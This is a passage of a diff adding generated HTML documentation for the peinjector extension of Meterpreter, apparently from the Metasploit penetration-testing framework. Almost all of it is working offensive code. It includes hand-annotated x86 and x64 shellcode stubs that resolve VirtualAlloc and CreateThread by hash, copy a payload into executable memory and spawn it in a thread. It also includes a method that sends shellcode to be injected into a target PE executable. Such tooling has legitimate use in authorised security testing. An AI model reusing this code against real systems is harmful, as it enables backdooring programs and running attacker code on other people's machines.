+  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+=</span> <span class='lbracket'>[</span><span class='id identifier rubyid_shellcode'>shellcode</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>-</span> <span class='int'>5</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x40</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                   <span class='comment'># push 40h
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x59</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># pop r9 now 40h
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x68\x00\x10\x00\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>             <span class='comment'># push 1000h
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x58</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># pop r8.. now 1000h
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x4C\x89\xF2</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                     <span class='comment'># mov rdx, r14
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6A\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># push 0
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x59</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                             <span class='comment'># pop rcx
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x68\x58\xa4\x53\xe5</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>             <span class='comment'># push E553a458
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x5A</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># pop r10
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xff\xd5</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># call rbp
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xc3</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                     <span class='comment'># mov rbx, rax      ; Store allocated address in ebx
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xc7</span><span class='tstring_end'>&quot;</span></span>                       <span class='comment'># mov rdi, rax      ; Prepare EDI with the new address
+</span>
+
+  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\xc7\xc1</span><span class='tstring_end'>&quot;</span></span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;dec eax&#39;, &#39;invalid&#39;] x64 = [&#39;invalid&#39;]
+</span>  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+=</span> <span class='lbracket'>[</span><span class='id identifier rubyid_shellcode'>shellcode</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>-</span> <span class='int'>5</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xeb\x43</span><span class='tstring_end'>&quot;</span></span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;jmp 0x45&#39;] x64 = [&#39;jmp 0x45&#39;]
+</span>
+  <span class='comment'># got_payload:
+</span>  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5e</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                       <span class='comment'># pop rsi            ; Prepare ESI with the source
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xf2\xa4</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># repne movsb        ; Copy the payload to RWX memo
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xe8\x00\x00\x00\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>             <span class='comment'># call set_handler   ; Configure error handling
+</span>
+      <span class='comment'># set_handler:
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x31\xC0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                     <span class='comment'># xor rax,rax
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x50</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                             <span class='comment'># push rax            ; LPDWORD lpThreadId (NULL)
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x50</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                             <span class='comment'># push rax            ; DWORD dwCreationFlags (0)
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x49\x89\xC1</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                     <span class='comment'># mov r9, rax         ; LPVOID lpParameter (NULL)
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xC2</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                     <span class='comment'># mov rdx, rax        ; LPTHREAD_START_ROUTINE  (payload)
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x49\x89\xD8</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                     <span class='comment'># mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xC1</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                     <span class='comment'># mov rcx, rax        ; LPSECURITY_ATTRIBUTES (NULL)
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x49\xC7\xC2\x38\x68\x0D\x16</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>     <span class='comment'># mov r10, 0x160D6838 ; hash(&quot;kernel32.dll&quot;,&quot;CreateThread&quot;)
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xFF\xD5</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># call rbp            ; Spawn payload thread
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x83\xC4\x58</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                 <span class='comment'># add rsp, 50
+</span>
+      <span class='comment'># stackrestore
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x64 = [&#39;popfq&#39;, &#39;pop r15&#39;, &#39;pop r14&#39;, &#39;pop r13&#39;, &#39;pop r12&#39;, &#39;pop r11&#39;, &#39;pop r10&#39;, &#39;pop r9&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58</span><span class='tstring_end'>&quot;</span></span>	<span class='comment'># AUTOMATED ASM: x64 = [&#39;pop r8&#39;, &#39;pop rbp&#39;, &#39;pop rsp&#39;, &#39;pop rdi&#39;, &#39;pop rsi&#39;, &#39;pop rdx&#39;, &#39;pop rcx&#39;, &#39;pop rbx&#39;, &#39;pop rax&#39;]
+</span>
+  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xe9</span><span class='tstring_end'>&quot;</span></span>	<span class='comment'># AUTOMATED ASM: x64 = [&#39;invalid&#39;]
+</span>  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+=</span> <span class='lbracket'>[</span><span class='id identifier rubyid_shellcode'>shellcode</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+  <span class='kw'>return</span> <span class='id identifier rubyid_stackpreserve'>stackpreserve</span> <span class='op'>+</span> <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+</span> <span class='id identifier rubyid_shellcode'>shellcode</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="add_thread_x86-instance_method">
+  
+    #<strong>add_thread_x86</strong>(payload)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/rex/post/meterpreter/extensions/peinjector/peinjector.rb', line 50</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_add_thread_x86'>add_thread_x86</span><span class='lparen'>(</span><span class='id identifier rubyid_payload'>payload</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_stackpreserve'>stackpreserve</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x90\x90\x60\x9c</span><span class='tstring_end'>&quot;</span></span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;nop&#39;, &#39;nop&#39;, &#39;pushad&#39;, &#39;pushfd&#39;]
+</span>  <span class='id identifier rubyid_shellcode'>shellcode</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xE8\xB7\xFF\xFF\xFF</span><span class='tstring_end'>&quot;</span></span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;call 0xffffffbc&#39;]
+</span>  <span class='id identifier rubyid_shellcode'>shellcode</span> <span class='op'>+=</span> <span class='id identifier rubyid_payload'>payload</span>
+
+  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;cld&#39;, &#39;nop&#39;, &#39;call 0xc8&#39;, &#39;pushad&#39;, &#39;mov ebp, esp&#39;, &#39;xor edx, edx&#39;, &#39;nop&#39;, &#39;invalid&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;push edx&#39;, &#39;xor [ebx+0x528b0c52], cl&#39;, &#39;adc al, 0xeb&#39;, &#39;invalid&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;inc ecx&#39;, &#39;adc [ebx-0x48f0d78e], cl&#39;, &#39;dec edx&#39;, &#39;xor edi, edi&#39;, &#39;xor eax, eax&#39;, &#39;lodsb&#39;, &#39;cmp al, 0x61&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;jl 0x4&#39;, &#39;sub al, 0x20&#39;, &#39;ror edi, 0xd&#39;, &#39;add edi, eax&#39;, &#39;dec ecx&#39;, &#39;jnz 0xfffffffb&#39;, &#39;push edx&#39;, &#39;nop&#39;, &#39;push edi&#39;, &#39;invalid&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;push edx&#39;, &#39;adc [eax+0x13c428b], dl&#39;, &#39;rcl byte [eax-0x1487bf75], 1&#39;, &#39;pop es&#39;, &#39;invalid&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;inc edx&#39;, &#39;add al, 0x85&#39;, &#39;jl 0x3f&#39;, &#39;test eax, eax&#39;, &#39;jz 0x75&#39;, &#39;nop&#39;, &#39;add eax, edx&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;push eax&#39;, &#39;nop&#39;, &#39;mov ecx, [eax+0x18]&#39;, &#39;mov ebx, [eax+0x20]&#39;, &#39;add ebx, edx&#39;, &#39;jecxz 0x64&#39;, &#39;dec ecx&#39;, &#39;mov esi, [ebx+ecx*4]&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;add esi, edx&#39;, &#39;xor edi, edi&#39;, &#39;nop&#39;, &#39;xor eax, eax&#39;, &#39;jmp 0xd&#39;, &#39;jmp far dword [ecx-0x2b]&#39;, &#39;invalid&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;or eax, 0xe038c701&#39;, &#39;jmp 0xc&#39;, &#39;jg 0x24&#39;, &#39;shr bl, cl&#39;, &#39;retf 0xe675&#39;, &#39;invalid&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;clc&#39;, &#39;cmp edi, [ebp+0x24]&#39;, &#39;jnz 0xffffffda&#39;, &#39;pop eax&#39;, &#39;nop&#39;, &#39;mov ebx, [eax+0x24]&#39;, &#39;add ebx, edx&#39;, &#39;nop&#39;, &#39;invalid&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;or al, 0x4b&#39;, &#39;mov ebx, [eax+0x1c]&#39;, &#39;add ebx, edx&#39;, &#39;nop&#39;, &#39;jmp 0xe&#39;, &#39;int 0x97&#39;, &#39;int1&#39;, &#39;mov cl, 0x8b&#39;, &#39;invalid&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;mov eax, [ecx]&#39;, &#39;rcl byte [eax+0x24244489], 1&#39;, &#39;pop ebx&#39;, &#39;pop ebx&#39;, &#39;popad&#39;, &#39;nop&#39;, &#39;pop ecx&#39;, &#39;pop edx&#39;, &#39;push ecx&#39;, &#39;invalid&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;add [edi], ecx&#39;, &#39;jmp eax&#39;, &#39;pop eax&#39;, &#39;nop&#39;, &#39;pop edi&#39;, &#39;pop edx&#39;, &#39;mov edx, [edx]&#39;, &#39;jmp 0xffffff62&#39;, &#39;nop&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5D\x90</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;pop ebp&#39;, &#39;nop&#39;] x64 = [&#39;pop rbp&#39;, &#39;nop&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xBE</span><span class='tstring_end'>&quot;</span></span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;invalid&#39;] x64 = [&#39;invalid&#39;]
+</span>
+  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+=</span><span class='lbracket'>[</span><span class='id identifier rubyid_shellcode'>shellcode</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>-</span> <span class='int'>5</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x90\x6A\x40\x90\x68\x00\x10\x00\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;nop&#39;, &#39;push 0x40&#39;, &#39;nop&#39;, &#39;push 0x1000&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;push esi&#39;, &#39;nop&#39;, &#39;push 0x0&#39;, &#39;push 0xe553a458&#39;, &#39;call ebp&#39;, &#39;mov ebx, eax&#39;, &#39;mov edi, eax&#39;, &#39;nop&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x89\xF1</span><span class='tstring_end'>&quot;</span></span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;mov ecx, esi&#39;] x64 = [&#39;mov ecx, esi&#39;]
+</span>
+  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xeb\x44</span><span class='tstring_end'>&quot;</span></span>  <span class='comment'># &lt;--length of shellcode below	# AUTOMATED ASM: x86 = [&#39;jmp 0x46&#39;]
+</span>
+  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x90\x5e</span><span class='tstring_end'>&quot;</span></span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;nop&#39;, &#39;pop esi&#39;]
+</span>
+  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x90\x90\x90</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;nop&#39;, &#39;nop&#39;, &#39;nop&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xF2\xA4</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;repne movsb&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xE8\x20\x00\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;invalid&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;add [ebx+0xa2a1de0], bh&#39;, &#39;nop&#39;, &#39;push 0x9dbd95a6&#39;, &#39;call ebp&#39;, &#39;cmp al, 0x6&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;jl 0xc&#39;, &#39;cmp bl, 0xe0&#39;, &#39;jnz 0xc&#39;, &#39;mov ebx, 0x6f721347&#39;, &#39;push 0x0&#39;, &#39;push ebx&#39;, &#39;invalid&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;aad 0x31&#39;, &#39;rcl byte [eax+0x50], 0x50&#39;, &#39;push ebx&#39;, &#39;push eax&#39;, &#39;push eax&#39;, &#39;push 0x160d6838&#39;, &#39;call ebp&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58\x58\x90\x61</span><span class='tstring_end'>&quot;</span></span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;pop eax&#39;, &#39;pop eax&#39;, &#39;nop&#39;, &#39;popad&#39;]
+</span>
+  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xe9</span><span class='tstring_end'>&quot;</span></span>	<span class='comment'># AUTOMATED ASM: x86 = [&#39;invalid&#39;]
+</span>
+  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+=</span> <span class='lbracket'>[</span><span class='id identifier rubyid_shellcode'>shellcode</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_stackpreserve'>stackpreserve</span> <span class='op'>+</span> <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+</span> <span class='id identifier rubyid_shellcode'>shellcode</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="inject_shellcode-instance_method">
+  
+    #<strong>inject_shellcode</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/rex/post/meterpreter/extensions/peinjector/peinjector.rb', line 34</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_inject_shellcode'>inject_shellcode</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:shellcode</span><span class='rbracket'>]</span>
+
+  <span class='id identifier rubyid_request'>request</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../Packet.html" title="Rex::Post::Meterpreter::Packet (class)">Packet</a></span></span><span class='period'>.</span><span class='id identifier rubyid_create_request'><span class='object_link'><a href="../../Packet.html#create_request-class_method" title="Rex::Post::Meterpreter::Packet.create_request (method)">create_request</a></span></span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../Peinjector.html#COMMAND_ID_PEINJECTOR_INJECT_SHELLCODE-constant" title="Rex::Post::Meterpreter::Extensions::Peinjector::COMMAND_ID_PEINJECTOR_INJECT_SHELLCODE (constant)">COMMAND_ID_PEINJECTOR_INJECT_SHELLCODE</a></span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_request'>request</span><span class='period'>.</span><span class='id identifier rubyid_add_tlv'>add_tlv</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../Peinjector.html#TLV_TYPE_PEINJECTOR_SHELLCODE-constant" title="Rex::Post::Meterpreter::Extensions::Peinjector::TLV_TYPE_PEINJECTOR_SHELLCODE (constant)">TLV_TYPE_PEINJECTOR_SHELLCODE</a></span></span><span class='comma'>,</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:shellcode</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_request'>request</span><span class='period'>.</span><span class='id identifier rubyid_add_tlv'>add_tlv</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../Peinjector.html#TLV_TYPE_PEINJECTOR_SHELLCODE_SIZE-constant" title="Rex::Post::Meterpreter::Extensions::Peinjector::TLV_TYPE_PEINJECTOR_SHELLCODE_SIZE (constant)">TLV_TYPE_PEINJECTOR_SHELLCODE_SIZE</a></span></span><span class='comma'>,</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:size</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_request'>request</span><span class='period'>.</span><span class='id identifier rubyid_add_tlv'>add_tlv</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../Peinjector.html#TLV_TYPE_PEINJECTOR_SHELLCODE_ISX64-constant" title="Rex::Post::Meterpreter::Extensions::Peinjector::TLV_TYPE_PEINJECTOR_SHELLCODE_ISX64 (constant)">TLV_TYPE_PEINJECTOR_SHELLCODE_ISX64</a></span></span><span class='comma'>,</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:isx64</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_request'>request</span><span class='period'>.</span><span class='id identifier rubyid_add_tlv'>add_tlv</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../Peinjector.html#TLV_TYPE_PEINJECTOR_TARGET_EXECUTABLE-constant" title="Rex::Post::Meterpreter::Extensions::Peinjector::TLV_TYPE_PEINJECTOR_TARGET_EXECUTABLE (constant)">TLV_TYPE_PEINJECTOR_TARGET_EXECUTABLE</a></span></span><span class='comma'>,</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:targetpe</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_response'>response</span> <span class='op'>=</span> <span class='id identifier rubyid_client'>client</span><span class='period'>.</span><span class='id identifier rubyid_send_request'>send_request</span><span class='lparen'>(</span><span class='id identifier rubyid_request'>request</span><span class='rparen'>)</span>
+
